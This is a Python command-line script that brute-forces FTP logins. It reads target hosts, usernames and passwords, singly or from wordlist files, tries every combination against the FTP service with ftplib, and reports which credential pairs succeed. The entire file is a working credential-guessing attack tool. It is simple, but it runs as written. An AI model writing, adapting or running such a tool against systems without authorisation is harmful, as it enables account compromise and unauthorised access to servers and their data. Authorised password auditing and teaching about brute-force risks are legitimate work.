#!/usr/bin/env python3
import os
import ftplib
import argparse
from argparse import RawTextHelpFormatter

def ftpBrute(target, usrname, password):
    try:
        #Test for connection to the host using ftp (port 21)
        ftp = ftplib.FTP(target, timeout=5)
        
        # Supplies the credentials and treis to log in
        ftp.login(user=usrname, passwd=password)
        
        # Prints a success message to the screen
        print(f"[+] Successfull login with {usrname}:{password}")
        
        # Stops the ftp enumeration
        ftp.quit()
        return True

# error handling            
    except ftplib.error_perm:
        # Returns  an error message for invalid creds
        print(f"[-] Failed login attempt with {usrname}:{password}")
        return False
    
    except Exception as e:
        # Handles other error messages and login isues like timeout
        print(f"[!] Failed to connect to {target}: \n{e}")
        return False


# Calling ftp_login_test
# Target_ip = input("Target> ")
# Usr = input("User> ")
# Passwd = input("Password> ")


# ftp_login_test(Target_ip, Usr, Passwd)



# Parses arguments and flags
def main():
# custom formating for the help menu
    custom_formatter = lambda prog: argparse.HelpFormatter(prog, max_help_position=40, width=100)
    
#   creates a variable parser and assigns it the argument attribute
    parser = argparse.ArgumentParser(description="Service bruteforcer", formatter_class=custom_formatter)

# Takes the various arguments for use    
# Target arguments
    parser.add_argument("-t", "--target", help="Single target info")
    parser.add_argument("-T", "--targets", help="Load targets file")
    
# User arguments
    parser.add_argument("-u", "--user", help="Single user info")
    parser.add_argument("-U", "--users", help="Load username file")
    
# Passwd arguments
    parser.add_argument("-p", "--password", help="Single password")  
    parser.add_argument("-P", "--passwords", help="Load passwords file")
    
    args = parser.parse_args()
    
    
# Process the host data
    targets = [] # creates a list called targets to store host data
    if args.target:
       targets.append(args.target) #appends the target arg to the targets list
    elif args.targets:
        if os.path.exists(args.targets):
            with open(args.targets, 'r', encoding="utf-8", errors='ignore') as f:
                targets = [line.strip() for line in f if line.strip()] # Load each non-empty line from the target file into the targets list.
        else:
             print(f"[-] File {args.targets} not found")
             return
    
# Process the user data
    users = []
    if args.user:
        users.append(args.user)
    elif args.users:
        if os.path.exists(args.users):
            with open(args.users, 'r', encoding="utf-8", errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
        else:
            print(f"[-] File {args.users} not found")
            return
    
# Process the password
    passwords = []
    if args.password:
        passwords.append(args.password)
    elif args.passwords:
        if os.path.exists(args.passwords):
            with open(args.passwords, 'r', encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            print(f"[-] File {args.passwords} not found")
            return
    
# Checks if parameters were provided
    if not targets or not users or not passwords:
        print("[!] Missing either target, user of password paramaters")
    
# Iterates and passes parameters to ftpLogin
    for Target in targets:
        for User in users:
            for Password in passwords:
                ftpBrute(Target, User, Password)

if __name__ == "__main__":
    main()
